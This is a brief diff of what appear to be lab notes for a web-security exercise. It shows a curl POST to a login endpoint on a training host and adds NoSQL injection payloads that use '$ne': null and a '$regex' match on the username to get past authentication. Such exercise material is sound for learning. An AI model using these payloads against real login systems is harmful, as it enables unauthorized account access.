@@ -13,3 +13,9 @@ curl -X POST http://web0x01.hbtn/api/a3/sql_injection/second_order/login \\n-H "
 
 "username":{"$ne":null},"password":{"$ne":null}
 
+
+
+{ 
+  "username": { "$regex": "^e", "$options": "i" },
+  "password": { "$ne": null }
+}
